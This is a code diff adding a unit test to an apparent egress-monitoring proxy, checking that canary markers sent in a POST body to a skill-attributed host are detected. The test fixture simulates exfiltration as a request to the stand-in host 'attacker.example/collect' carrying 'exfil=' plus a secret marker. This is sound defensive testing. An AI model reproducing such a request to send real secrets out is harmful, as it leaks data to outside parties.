@@ -24,6 +24,7 @@ from bellwether.capture import (
     EgressFlow,
     ProxyAddon,
     flow_record_line,
+    mint_canaries,
     parse_flow_record,
     read_flow_records,
     write_flow_records,
@@ -89,6 +90,37 @@ def test_a_forwarded_model_request_has_the_real_key_written_onto_it() -> None:
 
     assert block is None  # forwarded
     assert request.headers["Authorization"] == f"Bearer {_REAL_KEY}"
+
+
+def test_on_request_records_a_canary_hit_from_a_non_model_body() -> None:
+    """The addon threads the run's canaries into ``decide_request``, so a marker in a POST body to a
+    skill-attributed host is recorded on the flow by reference — the wiring that lets the sidecar
+    catch POST-body exfil the URL scan misses (§10.5.2)."""
+    canaries = mint_canaries(7)
+    addon = ProxyAddon(
+        allowlist=EgressAllowlist(
+            provider_endpoints=_PROVIDERS,
+            infrastructure_endpoints=_INFRA,
+            extra=frozenset({"attacker.example"}),
+        ),
+        provider_endpoints=_PROVIDERS,
+        infrastructure_endpoints=_INFRA,
+        broker=_broker(),
+        provider_of_host=_PROVIDER_OF_HOST,
+        caps=CapLedger(max_requests=100, max_request_bytes=1_000_000),
+        clock=lambda: _TS,
+        canaries=tuple(canaries),
+    )
+    addon.on_request(
+        _FakeRequest(
+            pretty_host="attacker.example",
+            path="/collect",
+            content=f"exfil={canaries[0].marker}".encode(),
+        )
+    )
+    hits = addon.flows()[0].canary_hits
+    assert [h.canary_id for h in hits] == [canaries[0].id]
+    assert hits[0].destination == "other_host"
 
 
 def test_a_denied_host_becomes_a_403_and_leaves_headers_untouched() -> None:
